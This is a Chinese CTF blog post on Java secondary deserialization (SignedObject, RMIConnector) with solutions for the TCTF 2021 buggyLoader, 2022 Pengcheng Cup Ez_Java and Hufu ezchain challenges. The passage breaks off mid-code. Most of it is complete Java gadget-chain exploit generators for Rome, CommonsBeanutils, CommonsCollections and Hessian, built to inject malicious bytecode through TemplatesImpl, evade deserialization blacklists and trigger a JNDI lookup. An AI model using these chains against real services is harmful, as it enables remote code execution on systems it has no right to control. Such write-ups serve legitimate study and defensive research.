title: java二次反序列化初探
author: bmth
tags:
  - 反序列化
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/7a17529ed4ae47098123f77824978b74.png'
cover: 'https://img-blog.csdnimg.cn/7a17529ed4ae47098123f77824978b74.png'
date: 2022-09-20 23:10:00
---
![](https://img-blog.csdnimg.cn/7a17529ed4ae47098123f77824978b74.png)

## 前置知识
ctf的题目越来越难了，java的考点也更多更复杂，这里就学习一下二次反序列化
### SignedObject
它是java.security下一个用于创建真实运行时对象的类，更具体地说，SignedObject包含另一个Serializable对象

看一下它的`getObject()`方法，是一个反序列化，并且该方法还是getter
![](https://img-blog.csdnimg.cn/be5ca3e27786411ebef69abd8260b7cf.png)

并且发现反序列化内容是可控的

![](https://img-blog.csdnimg.cn/d7d0ba45a9d04a9999038b2b0e902dc3.png)

**这里可以看到content是一个byte型数组`private byte[] content;`**
那么思路就很简单了，先构造一个恶意SignedObject
```java
KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject signedObject = new SignedObject(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance("DSA"));
```
然后调用它的getObject()方法即可，现在就需要找到调用到getObject()的链

#### Rome
在rome链中，我们知道`EqualsBean/ToStringBean`这两个类最终会触发getter，这里直接给出Poria师傅的代码
##### ToStringBean
利用 HashMap 反序列化调用 ObjectBean 的 hashCode 方法，再调用 ObjectBean 封装的 ToStringBean 的 toString 方法，最后触发 getter 方法
```java
import CommonsCollections.Evil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassPool;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;

public class RomeToStringBean {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception{
        byte[] bytes=ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        HashMap hashMap1 = getpayload(Templates.class, obj);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));

        HashMap hashMap2 = getpayload(SignedObject.class, signedObject);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap2);
        oos.close();
        //System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static HashMap getpayload(Class clazz, Object obj) throws Exception {
        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "rand"));
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "rand");
        ObjectBean expObjectBean = new ObjectBean(clazz, obj);
        setFieldValue(objectBean, "_equalsBean", new EqualsBean(ObjectBean.class, expObjectBean));
        return hashMap;
    }
}
```
![](https://img-blog.csdnimg.cn/47a2ab2d0408472cb579674d9dfc86e3.png)

可以看到调用栈为：
```
getObject:180, SignedObject (java.security)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:137, ToStringBean (com.sun.syndication.feed.impl)
toString:116, ToStringBean (com.sun.syndication.feed.impl)
toString:120, ObjectBean (com.sun.syndication.feed.impl)
beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)
hashCode:110, ObjectBean (com.sun.syndication.feed.impl)
hash:339, HashMap (java.util)
readObject:1413, HashMap (java.util)
```
成功执行到getObject，然后进行第二次反序列化，触发Evil恶意类


##### EqualsBean
利用 Hashtable 来触发equals，然后调用EqualsBean的 beanEquals 方法

```java
import CommonsCollections.Evil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javassist.ClassPool;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.*;
import java.util.HashMap;
import java.util.Hashtable;

public class RomeEqualsBean {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception{
        byte[] bytes=ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Hashtable table1 = getPayload(Templates.class, obj);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance("DSA"));

        Hashtable table2 = getPayload(SignedObject.class, signedObject);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(table2);
        oos.close();
        //System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception{
        EqualsBean bean = new EqualsBean(String.class, "r");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", payloadObj);
        map2.put("zZ", bean);
        map2.put("yy", payloadObj);
        Hashtable table = new Hashtable();
        table.put(map1, "1");
        table.put(map2, "2");
        setFieldValue(bean, "_beanClass", clazz);
        setFieldValue(bean, "_obj", payloadObj);
        return table;
    }
}
```
调用栈：
```
getObject:177, SignedObject (java.security)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
equals:103, EqualsBean (com.sun.syndication.feed.impl)
equals:495, AbstractMap (java.util)
reconstitutionPut:1241, Hashtable (java.util)
readObject:1215, Hashtable (java.util)
```

#### CommonsBeanutils
类`org.apache.commons.beanutils.BeanComparator`的compare方法会触发静态方法`PropertyUtils#getProperty`，最终直接调用任意getter方法
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.PriorityQueue;

public class CB_SingedfObject {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes= ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        PriorityQueue queue1 = getpayload(obj, "outputProperties");

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance("DSA"));

        PriorityQueue queue2 = getpayload(signedObject, "object");

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(queue2);
        oos.close();
        //System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static PriorityQueue<Object> getpayload(Object object, String string) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        setFieldValue(beanComparator, "property", string);
        setFieldValue(priorityQueue, "queue", new Object[]{object, null});
        return priorityQueue;
    }
}
```

调用链：
```
getObject:177, SignedObject (java.security)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeMethod:2170, PropertyUtilsBean (org.apache.commons.beanutils)
getSimpleProperty:1332, PropertyUtilsBean (org.apache.commons.beanutils)
getNestedProperty:770, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:846, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:426, PropertyUtils (org.apache.commons.beanutils)
compare:157, BeanComparator (org.apache.commons.beanutils)
siftDownUsingComparator:722, PriorityQueue (java.util)
siftDown:688, PriorityQueue (java.util)
heapify:737, PriorityQueue (java.util)
readObject:797, PriorityQueue (java.util)
```


简单总结一下，可以看出 SignedObject 的二次反序列化，运用最多的应该就是绕过黑名单了，因为本身存在缺陷，它的content为byte数组类型，导致不能绕过`URLClassLoader.loadClass()`这个万恶之源

### RMIConnector
看到`RMIConnector.findRMIServerJRMP`方法
![](https://img-blog.csdnimg.cn/a0da05e198884fafa600dc060e5da126.png)

这里对传入的 base64 反序列化，往上找看看哪里调用了这个方法，在findRMIServer方法中，如果 path 以 `/stub/`开头，就会调用`findRMIServerJRMP`
![](https://img-blog.csdnimg.cn/b06d3b66efbb4c0d8601847bc333790d.png)

继续往上找，在该类的 public 方法`connect`中看到调用`findRMIServer`并且传入 jmxServiceURL 参数，要求 rmiServer 为 null
![](https://img-blog.csdnimg.cn/321365300a004bf496a5925090b04623.png)
查找一下`RMIConnector`的利用
```java
JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
setFieldValue(jmxServiceURL, "urlPath", "/stub/base64string");
RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
```
接下来我们只要能调用它的connect方法就可以了

#### CommonsCollections
我们可以知道cc链的 InvokerTransformer 类可以调用任意实例的任意方法，那么我们调用 RMIConnector 的无参数方法connect即可

这里使用最常用的cc6，在ysoserial中，利用了
```
java.util.HashSet.readObject()->HashMap.put()->HashMap.hash(key) ->TiedMapEntry.hashCode()
```
而实际上，在`java.util.HashMap.readObject()`就有`hash(key)`的操作，我们可以利用此来构造gadget
![](https://img-blog.csdnimg.cn/b4e89d5fdda34f1f9c77166b839953c4.png)
最后的利用链为：
```
HashMap.readObject()
  hash(key) === key.hashCode() === TiedMapEntry.hashCode()
    TiedMapEntry.getValue()
      LazyMap.get()
         ChainedTransformer.transform()
          ConstantTransformer.transform()
          InvokerTransformer.transform()
          InvokerTransformer.transform()
          InvokerTransformer.transform()
```

参考：[反序列化篇6 CC6](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/)

我们改造成二次反序列化，最后的代码为：
```java
import CommonsCollections.Evil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC_RMIConnector {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static HashMap getObject() throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{ClassPool.getDefault().get(Evil.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);


        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(obj);

        setFieldValue(lazyMap,"factory", transformer);

        return expMap;
    }

    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();

        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());

        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(rmiConnector);

        setFieldValue(lazyMap,"factory", invokerTransformer);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(expMap);
        oos.close();
        //System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```
调用栈：
```
findRMIServerJRMP:1993, RMIConnector (javax.management.remote.rmi)
findRMIServer:1924, RMIConnector (javax.management.remote.rmi)
connect:287, RMIConnector (javax.management.remote.rmi)
connect:249, RMIConnector (javax.management.remote.rmi)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
transform:125, InvokerTransformer (org.apache.commons.collections.functors)
get:151, LazyMap (org.apache.commons.collections.map)
getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)
hash:339, HashMap (java.util)
readObject:1413, HashMap (java.util)
```

这条链在resolveClass方法被重写时利用的很多，其他情况比较鸡肋


参考：
[二次反序列化 看我一命通关](https://tttang.com/archive/1701/)

## 赛题复现
### [TCTF 2021]buggyLoader
这题也就是 javaDeserializeLabs 靶机的lab4：[https://github.com/waderwu/javaDeserializeLabs](https://github.com/waderwu/javaDeserializeLabs)

直接看lab4-shiro-blind，看到反序列化使用的是myObjectInputStream，代替了java默认的ObjectInputStream
![](https://img-blog.csdnimg.cn/943aa1e3dbc94466bc1ea3f8fef7abf2.png)

可以看到重写了resolveClass方法，使用了`URLClassLoader.loadClass()`而非默认的`Class.forName()`去加载类
![](https://img-blog.csdnimg.cn/8d27873d9dec442b9d0b1a9042a07347.png)
两者主要的不同点在于`URLClassLoader.loadClass()`不能够加载数组，举个栗子：
```java
public class test {
    public static void main(String[] args) throws Exception{
        System.out.println(Class.forName("[[B"));  // class [[B
        System.out.println(URLClassLoader.getSystemClassLoader().loadClass("[[B"));  // ClassNotFoundException
    }
}
```
这样一来，我们之前的payload都无法使用了，在CC链中我们的sink(终点)实际上只有2个，一个是利用`TemplatesImpl`类实现任意java代码执行，一个是利用`ChainedTransformer`类链式调用实现任意命令执行，但是这两者在这道题都没办法使用，前者使用了`byte[][]`，而后者则使用了`Transforme[]`

直接打 RMIConnector 这条链
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import rome.SpringEcho;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class buggyLoader {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static HashMap getObject() throws Exception{
        //cc6的HashMap链
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{ClassPool.getDefault().get(SpringEcho.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);


        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(obj);

        setFieldValue(lazyMap,"factory", transformer);

        return expMap;
    }
    public static String bytesTohexString(byte[] bytes) {
        //题目要求16进制
        if (bytes == null)
            return null;
        StringBuilder ret = new StringBuilder(2 * bytes.length);
        for (int i = 0; i < bytes.length; i++) {
            int b = 0xF & bytes[i] >> 4;
            ret.append("0123456789abcdef".charAt(b));
            b = 0xF & bytes[i];
            ret.append("0123456789abcdef".charAt(b));
        }
        return ret.toString();
    }

    public static void main(String[] args) throws Exception {
        //获取exp的base64编码
        ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();

        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());

        //创建恶意的RMIConnector
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        //使用InvokerTransformer 调用 connect 方法
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(rmiConnector);

        setFieldValue(lazyMap,"factory", invokerTransformer);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeUTF("SJTU");
        oos.writeInt(1896);
        oos.writeObject(expMap);
        oos.close();
        System.out.println(bytesTohexString(baos.toByteArray()));
    }
}
```
先打一个回显试一下

![](https://img-blog.csdnimg.cn/77a7f3ebe1ba4cc59fad90b8e191a77f.png)

成功了，那内存马不就手到擒来，就不多分析了


参考：
[TCTF 2021——buggyLoader(二次反序列化)](http://miku233.viewofthai.link/2022/05/29/buggyLoader/)
[Java安全大杂烩的CTF题-buggyloader](https://www.bilibili.com/video/BV1LZ4y1m7Ah)
[JavaDerserializeLabs-writeup](http://novic4.cn/index.php/archives/26.html)
[javaDeserializeLabs writeup](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/javaDeserializeLabs%20writeup/)

### [2022鹏城杯]Ez_Java
`/read`可以打反序列化
![](https://img-blog.csdnimg.cn/5df8ac3baae64ed2bf497ea216500035.png)

看一下lib，发现存在cc链和cb链
![](https://img-blog.csdnimg.cn/8ff03bdc8d464ba2aeee139f4d94e974.png)


跟进Secure，看到是一个黑名单过滤(这里使用jd-gu反编译是看不到黑名单的，我这里换了jadx)
![](https://img-blog.csdnimg.cn/98ea8e9393f240cfaa93c0cc5ac72d18.png)

主要是`TemplatesImpl`和`ChainedTransformer`这两个命令执行的类给ban了，那么就需要使用二次反序列化的方法，这里直接使用SignedObject的cb链
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.PriorityQueue;

public class CB_SingedfObject {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes= ClassPool.getDefault().get(SpringEcho.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        PriorityQueue queue1 = getpayload(obj, "outputProperties");

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance("DSA"));

        PriorityQueue queue2 = getpayload(signedObject, "object");

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(queue2);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
    }

    public static PriorityQueue<Object> getpayload(Object object, String string) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        setFieldValue(beanComparator, "property", string);
        setFieldValue(priorityQueue, "queue", new Object[]{object, null});
        return priorityQueue;
    }
}
```
得到payload，将url编码传进去就可以了
![](https://img-blog.csdnimg.cn/06aa549736c4416fbce2ac1014f7ffd6.png)

这里还有个小trick：**黑名单过滤了CC3.2的TiedMapEntry，我们可以使用CC4.0的TiedMapEntry代替**，直接打RMIConnector的二次反序列化(cc6和cc2都可以打)


### [2022虎符]ezchain(Hessian2反序列化)
拿到源码，看一下发现存在rome1.7的依赖
![](https://img-blog.csdnimg.cn/5866677fe6bb417fb02be831b9880ba7.png)

然后如果满足条件：
```java
Objects.hashCode(token) == secret.hashCode() && !secret.equals(token)
```
就会使用Hessian2Input进行反序列化，但是 Hessian 相对比原生反序列化的利用链，有几个限制：
- kick-off chain 起始方法只能为 hashCode/equals/compareTo 方法
- 利用链中调用的成员变量不能为 transient 修饰
- 所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter/setter 的逻辑

#### JdbcRowSetImpl打JNDI注入
前面的相当于rome链，就直接看后面的jdbc了
当触发了`ToStringBean.toString`时，它就可以调用全部无参 getter 方法
![](https://img-blog.csdnimg.cn/ea95bc78021149cfa93beefa348ea991.png)
调用`getDatabaseMetadata`导致触发了`JdbcRowSetImpl.connect()`
![](https://img-blog.csdnimg.cn/c10f1ba7d6d84d4f8539f9ac1be842b8.png)

最后就到了`context.lookup`，可以JNDI注入
![](https://img-blog.csdnimg.cn/4b2b50f425844a2eb3adefe4da6d32a4.png)

最后的exp如下：
```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Hessian_rome_JNDI implements Serializable {
    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }

    public static void main(String[] args) throws Exception {
        String jndiUrl = "ldap://127.0.0.1:1389/TomcatBypass/Command/calc";
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiUrl);
        jdbcRowSet.setMatchColumn("foo");

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);

        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        HashMap hashMap = makeMap(root,"1");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        hessian2Output.writeObject(hashMap);
        hessian2Output.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input hessian2Input = new Hessian2Input(bais);
        hessian2Input.readObject();
    }
}
```
调用栈如下：
```
connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:538, SerializerFactory (com.caucho.hessian.io)
readObject:2110, Hessian2Input (com.caucho.hessian.io)
```
这里我打本地的高版本，成功，但题目是不出网的，用不了JNDI，就需要第二种解法了
![](https://img-blog.csdnimg.cn/58e22aa2f1804afdab5107090d5eb154.png)

#### SignedObject二次反序列化
不能直接打rome链，因为TemplatesImpl类中被transient修饰的`_tfactory`属性无法被序列化，进而导致TemplatesImpl类无法初始化
![](https://img-blog.csdnimg.cn/12f1072dcf48488d88ec8110edc7125d.png)

为什么使用Java原生反序列化时不会报错：
因为在使用Java原生的反序列化时，如果被反序列化的类重写了readObject()，那么Java就会通过反射来调用重写的readObject()
![](https://img-blog.csdnimg.cn/00d0a53b313e4f3186e1837c6f552018.png)

可以看到TemplatesImpl在调用重写的readObject()时`_tfactory`会被实例化，那么ToStringBean遍历并调用`getOutputProperties`方法时，内部的`_tfactory.getExternalExtensionsMap()`调用也就不会报错了

我们可以使用二次反序列化来绕过限制
```java
import CommonsCollections.Evil;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
